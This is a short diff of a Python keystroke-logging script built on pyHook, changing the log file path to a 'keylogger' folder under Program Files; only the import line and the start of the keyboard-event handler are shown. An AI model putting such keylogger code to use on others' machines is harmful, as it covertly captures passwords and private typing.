@@ -2,7 +2,7 @@
 
 import pyHook, pythoncom, sys, logging
 
-file_log = 'C:\\Users\\Suriyaa\\Downloads\\log.txt'
+file_log = 'C:\\Program Files\\keylogger\\log.txt'
 
 def OnKeyboardEvent(event):
     logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
